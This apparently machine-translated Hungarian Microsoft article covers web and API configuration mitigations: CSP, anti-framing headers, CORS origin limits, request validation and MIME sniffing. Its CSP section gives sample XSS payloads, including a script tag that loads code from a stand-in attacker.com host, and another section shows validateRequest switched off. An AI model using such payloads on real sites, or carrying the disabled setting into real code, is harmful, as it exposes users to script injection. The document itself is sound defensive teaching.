---
title: A Microsoft Threat Modeling Tool konfigurációjának kezelése
titleSuffix: Azure
description: Ismerkedjen meg a Threat Modeling Tool konfigurációjának kezelésével. Tekintse meg a kockázatcsökkentő információkat és a kód megjelenítése példákat.
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.custom: devx-track-js, devx-track-csharp
ms.openlocfilehash: 8cbe6b39bda0815c4981c497c07750136bcc9dba
ms.sourcegitcommit: f28ebb95ae9aaaff3f87d8388a09b41e0b3445b5
ms.translationtype: MT
ms.contentlocale: hu-HU
ms.lasthandoff: 03/29/2021
ms.locfileid: "94517484"
---
# <a name="security-frame-configuration-management--mitigations"></a>Biztonsági keret: konfiguráció kezelése | Enyhítését 
| Termék/szolgáltatás | Cikk |
| --------------- | ------- |
| **Webalkalmazás** | <ul><li>[A Content Security Policy (CSP) implementálása és a beágyazott JavaScript letiltása](#csp-js)</li><li>[A böngésző XSS-szűrőjének engedélyezése](#xss-filter)</li><li>[A ASP.NET alkalmazásoknak le kell tiltaniuk a nyomkövetést és a hibakeresést a telepítés előtt](#trace-deploy)</li><li>[Harmadik féltől származó JavaScriptek elérése kizárólag megbízható forrásokból](#js-trusted)</li><li>[Győződjön meg arról, hogy a hitelesített ASP.NET-lapok felhasználói felületi felöltözködni vagy kattintásos védelem](#ui-defenses)</li><li>[Győződjön meg arról, hogy csak a megbízható eredetek engedélyezettek, ha a CORS engedélyezve van a ASP.NET webalkalmazásokban](#cors-aspnet)</li><li>[ValidateRequest attribútum engedélyezése a ASP.NET lapokon](#validate-aspnet)</li><li>[A JavaScript-kódtárak helyileg üzemeltetett legújabb verzióinak használata](#local-js)</li><li>[Automatikus MIME-elemzés letiltása](#mime-sniff)</li><li>[A szabványos kiszolgálók fejlécének eltávolítása a Windows Azure webhelyein az ujjlenyomat elkerüléséhez](#standard-finger)</li></ul> |
| **Adatbázis** | <ul><li>[A Windows tűzfal konfigurálása az adatbázismotor-hozzáféréshez](#firewall-db)</li></ul> |
| **Webes API** | <ul><li>[Győződjön meg arról, hogy csak a megbízható eredetek engedélyezettek, ha a CORS engedélyezve van a ASP.NET webes API-ban](#cors-api)</li><li>[A webes API bizalmas adatokat tartalmazó konfigurációs fájljainak részeinek titkosítása](#config-sensitive)</li></ul> |
| **IoT-eszköz** | <ul><li>[Győződjön meg arról, hogy az összes felügyeleti felület erős hitelesítő adatokkal van védve](#admin-strong)</li><li>[Győződjön meg arról, hogy az ismeretlen kód nem hajtható végre az eszközökön](#unknown-exe)</li><li>[Az operációs rendszer és a IoT-eszköz további partícióinak titkosítása a bites zárolással](#partition-iot)</li><li>[Győződjön meg arról, hogy csak a minimális szolgáltatások/szolgáltatások engedélyezve vannak az eszközökön](#min-enable)</li></ul> |
| **IoT-mező átjárója** | <ul><li>[Az operációs rendszer és a IoT további partícióinak titkosítása a bit-Locker használatával](#field-bit-locker)</li><li>[Győződjön meg arról, hogy a helyszíni átjáró alapértelmezett bejelentkezési hitelesítő adatai módosulnak a telepítés során](#default-change)</li></ul> |
| **IoT Cloud Gateway** | <ul><li>[Győződjön meg arról, hogy a felhőalapú átjáró egy folyamatot valósít meg a csatlakoztatott eszközök belső vezérlőprogram naprakészen tartásához](#cloud-firmware)</li></ul> |
| **Számítógép-megbízhatósági kapcsolat határa** | <ul><li>[Győződjön meg arról, hogy az eszközökön szervezeti házirendként konfigurált végponti biztonsági vezérlők vannak konfigurálva](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Az Azure Storage-hozzáférési kulcsok biztonságos kezelésének biztosítása](#secure-keys)</li><li>[Győződjön meg arról, hogy csak a megbízható eredetek engedélyezettek, ha a CORS engedélyezve van az Azure Storage-ban](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[A WCF szolgáltatás-szabályozási funkciójának engedélyezése](#throttling)</li><li>[WCF – információk közzététele metaadatokon keresztül](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>A Content Security Policy (CSP) implementálása és a beágyazott JavaScript letiltása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | A tartalom biztonsági [házirendjének](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), a [tartalmi biztonsági házirendek referenciájának](https://content-security-policy.com/), a [biztonsági funkcióknak](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [a tartalmi biztonsági házirend bevezetésének](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)bemutatása, használhatom a CSP-t [?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Lépések** | <p>A Content Security Policy (CSP) egy, a W3C szabványnak megfelelő védelmi mechanizmus, amely lehetővé teszi, hogy a webalkalmazások tulajdonosai szabályozzák a helyükön beágyazott tartalmat. A CSP a webkiszolgálón HTTP-válasz fejlécként van hozzáadva, és az ügyféloldali böngészőkben kényszerítve van. Ez egy engedélyezett lista-alapú házirend – a webhelyek deklarálják azon megbízható tartományok készletét, amelyekről az aktív tartalmak, például a JavaScript betölthetők.</p><p>A CSP a következő biztonsági előnyöket nyújtja:</p><ul><li>Az **XSS elleni védelem:** Ha egy oldal sebezhető az XSS-vel, a támadó a következő két módon használhatja ki:<ul><li>Adja meg a t `<script>malicious code</script>` . Ez a biztonsági rés a CSP alapkorlátozása miatt nem fog működni – 1</li><li>Adja meg a t `<script src="http://attacker.com/maliciousCode.js"/>` . Ez a biztonsági rés nem fog működni, mivel a támadó által vezérelt tartomány nem a CSP engedélyezési listáján található.</li></ul></li><li>**Az adatkiszűrése vezérlése:** Ha a weblapon lévő bármilyen kártékony tartalom megpróbál csatlakozni egy külső webhelyhez, és ellopja az adatokat, a rendszer megszakítja a kapcsolatot a CSP-vel. Ennek az az oka, hogy a célként megadott tartomány nem a CSP engedélyezési listájában jelenik meg.</li><li>**Védelem a Click-Jacks:** Click-jacking olyan támadási technika, amellyel egy támadó egy valódi webhelyet tud kialakítani, és rákényszerítheti a felhasználókat, hogy a felhasználói felület elemeire kattintanak. Jelenleg a Click-jacking elleni védelem a válasz fejlécének (X-frame-Options) konfigurálásával érhető el. Nem minden böngésző tartja tiszteletben ezt a fejlécet, és a továbbiakban a CSP szabványos módszert biztosít a kattintások elleni védelemhez</li><li>**Valós idejű támadások jelentése:** Ha egy CSP-t támogató webhelyen van egy injekciós támadás, a böngészők automatikusan elindítanak egy értesítést a webkiszolgálón konfigurált végpontnak. Így a CSP valós idejű figyelmeztetési rendszerként szolgál.</li></ul> |

### <a name="example"></a>Példa
Példa házirend: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Ez a szabályzat lehetővé teszi a parancsfájlok betöltését csak a webalkalmazás kiszolgálója és a Google Analytics-kiszolgáló között. A más helyekről betöltött parancsfájlok el lesznek utasítva. Ha a CSP engedélyezve van egy webhelyen, a következő funkciók automatikusan le lesznek tiltva az XSS-támadások enyhítése érdekében. 

### <a name="example"></a>Példa
A beágyazott parancsfájlok nem lesznek végrehajtva. A következő példák a beágyazott parancsfájlokra 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Példa
A karakterláncok nem lesznek kódként kiértékelve. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>A böngésző XSS-szűrőjének engedélyezése

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [XSS védelmi szűrő](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Lépések** | <p>X-XSS – a védelmi válasz fejlécének beállításai vezérlik a böngésző többhelyes parancsfájl-szűrőjét. A válasz fejlécének értékei a következők lehetnek:</p><ul><li>`0:` Ezzel letiltja a szűrőt.</li><li>`1: Filter enabled` Ha a rendszer helyek közötti parancsfájl-megtámadást észlel a támadás leállítása érdekében, a böngésző megtisztítja a lapot</li><li>`1: mode=block : Filter enabled`. A lap tisztítása helyett az XSS-támadás észlelése után a böngésző megakadályozza az oldal megjelenítését</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. A böngésző megtisztítja a lapot, és jelentést küld a szabálysértésről.</li></ul><p>Ez egy Chromium-függvény, amely CSP-megsértési jelentéseket használ, hogy adatokat küldjön a választott URI-nak. Az utolsó 2 lehetőség biztonságos értéknek számít.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>A ASP.NET alkalmazásoknak le kell tiltaniuk a nyomkövetést és a hibakeresést a telepítés előtt

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [ASP.net-hibakeresés áttekintése](/previous-versions/ms227556(v=vs.140)), [ASP.net-nyomkövetés áttekintése](/previous-versions/bb386420(v=vs.140)), [útmutató: ASP.NET-alkalmazás nyomkövetésének engedélyezése](/previous-versions/0x5wc973(v=vs.140)), [útmutató: ASP.NET alkalmazások hibakeresésének engedélyezése](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Lépések** | Ha a nyomkövetés engedélyezve van az oldalon, minden azt kérő böngésző a belső kiszolgáló állapotáról és a munkafolyamatról adatokat tartalmazó nyomkövetési adatokat is beolvassa. Ez az információ biztonsági szempontból érzékeny lehet. Ha a hibakeresés engedélyezve van az oldalon, a kiszolgálón előforduló hibák a böngészőben megjelenített teljes verem nyomkövetési adatát eredményezik. Ezek az adatok biztonsági szempontból bizalmas adatokat tehetnek elérhetővé a kiszolgáló munkafolyamatáról. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Harmadik féltől származó JavaScriptek elérése kizárólag megbízható forrásokból

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | a harmadik féltől származó JavaScripteket csak megbízható forrásból lehet hivatkozni. A hivatkozási végpontoknak mindig a TLS-ben kell lenniük. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Győződjön meg arról, hogy a hitelesített ASP.NET-lapok felhasználói felületi felöltözködni vagy kattintásos védelem

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [OWASP Click-the Defense cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Internals – a Click-Jacks with X-frame-Options elleni küzdelem](/archive/blogs/ieinternals/combating-clickjacking-with-x-frame-options) |
| **Lépések** | <p>Ha a támadó több transzparens vagy átlátszatlan réteget használ, a felhasználó egy gombra kattintva vagy egy másik lapon lévő hivatkozásra kattinthat, amikor a legfelső szintű lapra kattintanak, a "felhasználói felületi jogorvoslati támadás" néven is ismert.</p><p>Ezt a rétegződést úgy érheti el, ha egy rosszindulatú oldalt biztosít egy iframe-sel, amely betölti az áldozat oldalát. Így a támadó "eltéríti" az oldalát, és átirányítja őket egy másik oldalra, valószínűleg egy másik alkalmazás, tartomány vagy mindkettő tulajdonosa. Ha meg szeretné akadályozni, hogy a kattintásos támadásokat engedélyezze, állítsa be a megfelelő X-frame-Options HTTP-válasz fejléceket, amelyek arra utasítja a böngészőt, hogy ne engedélyezzék más tartományok</p>|

### <a name="example"></a>Példa
Az X-FRAME-OPTIONs fejléc az IIS web.config használatával állítható be. Web.config kódrészlet olyan helyekhez, amelyeknek soha nem szabad keretbe esniük: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Példa
Web.config kódot olyan helyekhez, amelyek csak ugyanabban a tartományban lévő lapok szerint vannak bekeretezett: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Győződjön meg arról, hogy csak a megbízható eredetek engedélyezettek, ha a CORS engedélyezve van a ASP.NET webalkalmazásokban

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Web Forms, MVC5 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ezt a korlátozást azonos eredetű házirendnek nevezzük, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatokat olvasson be egy másik helyről. Előfordulhat azonban, hogy szükség van az API-k biztonságos elérhetővé tételére, amelyet más helyek is használhatnak. A több forrásból származó erőforrás-megosztás (CORS) egy W3C szabvány, amely lehetővé teszi a kiszolgáló számára, hogy az azonos eredetű házirendet kikapcsolódjon. A CORS használatával a kiszolgáló explicit módon engedélyezheti a több forrásból származó kérelmeket, miközben mások elutasítása is megtörtént.</p><p>A CORS biztonságosabb és rugalmasabb, mint a korábbi módszerek, például a JSNOP támogatással. A CORS lehetővé teszi, hogy a lefordítsa néhány HTTP-válaszüzenet (hozzáférés-vezérlés-*) hozzáadását a webalkalmazáshoz, és ez több módon is elvégezhető.</p>|

### <a name="example"></a>Példa
Ha elérhető Web.confighoz való hozzáférés, akkor a CORS a következő kód használatával adható hozzá: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Példa
Ha a web.confighoz való hozzáférés nem érhető el, a CORS a következő CSharp-kód hozzáadásával konfigurálható: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Fontos megjegyezni, hogy a "hozzáférés-vezérlés-engedélyezés-eredet" attribútumban található Origins lista véges és megbízható származási csoportra van beállítva. Ha nem megfelelően konfigurálja ezt a beállítást (például ha az értéket "*" értékre állítja be), a rosszindulatú helyek a webalkalmazások felé irányuló kérelmeket válthatnak be >korlátozás nélkül, így az alkalmazás sebezhetővé válik a CSRF támadásokkal szemben. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>ValidateRequest attribútum engedélyezése a ASP.NET lapokon

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Web Forms, MVC5 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Kérelem érvényesítése – parancsfájlok elleni támadások megakadályozása](https://www.asp.net/whitepapers/request-validation) |
| **Lépések** | <p>A 1,1-es verzió óta a ASP.NET szolgáltatásának ellenőrzése a kérelem érvényesítésével megakadályozhatja, hogy a kiszolgáló fogadja a nem kódolt HTML-kódot tartalmazó tartalmat. Ez a szolgáltatás úgy lett kialakítva, hogy segítsen megakadályozni bizonyos parancsfájl-befecskendezéses támadásokat, amelyekben az ügyfél-parancsfájl vagy a HTML-kód tudatlanul módon elküldhető egy kiszolgálónak, tároltnak és más felhasználóknak. Továbbra is erősen ajánlott az összes bemeneti adat és HTML-kódolás ellenőrzése, ha szükséges.</p><p>A kérelem érvényesítése az összes bemeneti adatnak a potenciálisan veszélyes értékek listájára való összehasonlításával történik. Ha egyezés történik, a ASP.NET megemel `HttpRequestValidationException` . Alapértelmezés szerint a kérelem-ellenőrzési funkció engedélyezve van.</p>|

### <a name="example"></a>Példa
Ez a funkció azonban a lap szintjén is letiltható: 
```XML
<%@ Page validateRequest="false" %> 
```
vagy alkalmazás szintjén 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Vegye figyelembe, hogy a kérelem-ellenőrzési funkció nem támogatott, és nem része a MVC6 folyamatnak. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>A JavaScript-kódtárak helyileg üzemeltetett legújabb verzióinak használata

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | <p>A hagyományos JavaScript-kódtárakat (például a JQuery) használó fejlesztőknek olyan általános JavaScript-kódtárak jóváhagyott verzióit kell használniuk, amelyek nem tartalmaznak ismert biztonsági hibákat. Helyes gyakorlat a kódtárak legújabb verziójának használata, mivel ezek a régebbi verziókban az ismert biztonsági rések biztonsági javításait tartalmazzák.</p><p>Ha a legutóbbi kiadás kompatibilitási okok miatt nem használható, az alábbi minimális verziókat kell használni.</p><p>Elfogadható minimális verziók:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery-ellenőrzés 1,9</li><li>JQuery Mobile 1.0.1</li><li>JQuery-ciklus 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms és AJAX**<ul><li>ASP.NET Web Forms és AJAX 4</li><li>ASP.NET AJAX 3,5</li></ul></li><li>**ASP.NET, MVC**<ul><li>ASP.NET MVC 3,0</li></ul></li></ul><p>Soha ne töltsön be JavaScript-függvénytárat külső webhelyekről, például nyilvános CDNs</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Automatikus MIME-elemzés letiltása

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [IE8 biztonsági rész V: átfogó védelem](/archive/blogs/ie/ie8-security-part-v-comprehensive-protection), [MIME-típus](https://en.wikipedia.org/wiki/Mime_type) |
| **Lépések** | Az X-Content-Type-Options fejléc egy HTTP-fejléc, amely lehetővé teszi a fejlesztők számára, hogy a tartalmuk ne legyenek MIME-szippantva. Ez a fejléc a MIME-Sniffing támadások enyhítésére szolgál. Minden olyan oldal esetében, amely tartalmazhatja a felhasználó által ellenőrizhető tartalmat, az X-Content-Type-Options: deszippantás HTTP-fejlécet kell használnia. Ha az alkalmazás összes oldalához globálisan szeretné engedélyezni a szükséges fejlécet, a következők egyikét teheti:|

### <a name="example"></a>Példa
Adja hozzá a fejlécet a web.config fájlban, ha az alkalmazást Internet Information Services (IIS) 7-től futtatja. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Példa
A fejléc hozzáadása a globális alkalmazás \_ BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Példa
Egyéni HTTP-modul implementálása 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Példa
A szükséges fejlécet csak adott lapokon engedélyezheti, ha hozzáadja azt az egyes válaszokhoz: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>A szabványos kiszolgálók fejlécének eltávolítása a Windows Azure webhelyein az ujjlenyomat elkerüléséhez

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webalkalmazás | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | Általános |
| **Attribútumok**              | EnvironmentType – Azure |
| **Hivatkozások**              | [A szabványos kiszolgálók fejlécének eltávolítása a Windows Azure webhelyek szolgáltatásban](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Lépések** | Az olyan fejlécek, mint a kiszolgáló, az X-alapú, X-AspNet-Version a kiszolgálóval és a mögöttes technológiákkal kapcsolatos információkat mutatják ki. Ajánlott letiltani ezeket a fejléceket, így megakadályozva az alkalmazás ujjlenyomatát |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>A Windows tűzfal konfigurálása az adatbázismotor-hozzáféréshez

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Adatbázis | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | SQL Azure, helyszíni |
| **Attribútumok**              | N/A, SQL-verzió – V12 |
| **Hivatkozások**              | [Azure SQL Database tűzfal konfigurálása](../../azure-sql/database/firewall-configure.md), a [Windows tűzfal konfigurálása az adatbázismotor-hozzáféréshez](/sql/database-engine/configure-windows/configure-a-windows-firewall-for-database-engine-access) |
| **Lépések** | A tűzfalrendszerek segítenek a számítógépes erőforrások illetéktelen elérésének megakadályozásában. Ha tűzfalon keresztül szeretné elérni a SQL Server adatbázismotor egy példányát, akkor a hozzáférés engedélyezéséhez konfigurálnia kell a tűzfalat a SQL Server rendszert futtató számítógépen. |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Győződjön meg arról, hogy csak a megbízható eredetek engedélyezettek, ha a CORS engedélyezve van a ASP.NET webes API-ban

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | MVC 5 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Az ASP.net web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), a [ASP.net web API-CORS támogatása a ASP.net web API 2](/archive/msdn-magazine/2013/december/asp-net-web-api-cors-support-in-asp-net-web-api-2) |
| **Lépések** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ezt a korlátozást azonos eredetű házirendnek nevezzük, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatokat olvasson be egy másik helyről. Előfordulhat azonban, hogy szükség van az API-k biztonságos elérhetővé tételére, amelyet más helyek is használhatnak. A több forrásból származó erőforrás-megosztás (CORS) egy W3C szabvány, amely lehetővé teszi a kiszolgáló számára, hogy az azonos eredetű házirendet kikapcsolódjon.</p><p>A CORS használatával a kiszolgáló explicit módon engedélyezheti a több forrásból származó kérelmeket, miközben mások elutasítása is megtörtént. A CORS biztonságosabb és rugalmasabb, mint a korábbi módszerek, például a JSNOP támogatással.</p>|

### <a name="example"></a>Példa
A App_Start/WebApiConfig.cs adja hozzá a következő kódot a WebApiConfig. register metódushoz 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Példa
A EnableCors attribútum a vezérlőben a következő módon alkalmazható a műveleti metódusokra: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Fontos, hogy a EnableCors attribútumban lévő Origins-lista véges és megbízható eredetű készletre legyen állítva. Ha nem megfelelően konfigurálja ezt a beállítást (például a "*" érték megadásával), a rosszindulatú helyek az API-k számára korlátozás nélkül indíthatnak kereszthivatkozásokat az API-hoz, >így az API sebezhetővé válik a CSRF támadásokkal szemben. A EnableCors a vezérlő szintjén lehet megdíszítve. 

### <a name="example"></a>Példa
Egy adott metódus CORS letiltásához a DisableCors attribútum a lent látható módon használható: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL-fázis**               | Létrehozás |  
| **Alkalmazható technológiák** | MVC 6 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Az CORS ASP.NET Core 1,0-es verziójának engedélyezése](https://docs.asp.net/en/latest/security/cors.html) |
| **Lépések** | <p>ASP.NET Core 1,0-ben a CORS-t middleware használatával vagy MVC használatával lehet engedélyezni. Ha MVC-t használ a CORS engedélyezéséhez, a rendszer a CORS-szolgáltatásokat is használja, de a CORS middleware nem.</p>|

**Megközelítés – 1** CORS engedélyezése a middleware használatával: Ha engedélyezni szeretné a teljes alkalmazás CORS, adja hozzá a CORS middleware-t a kérési folyamathoz a UseCors-bővítmény módszerével. A CORS middleware a CorsPolicyBuilder osztály használatával történő hozzáadásakor a rendszer több eredetű házirendet is megadhat. Ezt kétféleképpen teheti meg:

### <a name="example"></a>Példa
Az első a UseCors meghívása lambda használatával. A lambda egy CorsPolicyBuilder objektumot vesz igénybe: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Példa
A második egy vagy több elnevezett CORS-szabályzatot határoz meg, majd a házirendet a futtatási idő szerint válassza ki. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Megközelítés – 2** A CORS MVC-ben való engedélyezése: a fejlesztők az MVC használatával specifikus CORS alkalmazhatnak műveleti, vezérlőn vagy globálisan az összes vezérlőn.

### <a name="example"></a>Példa
Művelet: egy adott művelethez tartozó CORS-házirend megadásához adja hozzá a (z) [EnableCors] attribútumot a művelethez. Adja meg a szabályzat nevét. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Példa
/Vezérlő: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Példa
Globálisan 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Fontos, hogy a EnableCors attribútumban lévő Origins-lista véges és megbízható eredetű készletre legyen állítva. Ha nem megfelelően konfigurálja ezt a beállítást (például a "*" érték megadásával), a rosszindulatú helyek az API-k számára korlátozás nélkül indíthatnak kereszthivatkozásokat az API-hoz, >így az API sebezhetővé válik a CSRF támadásokkal szemben. 

### <a name="example"></a>Példa
Egy vezérlő vagy művelet CORS letiltásához használja a [DisableCors] attribútumot. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

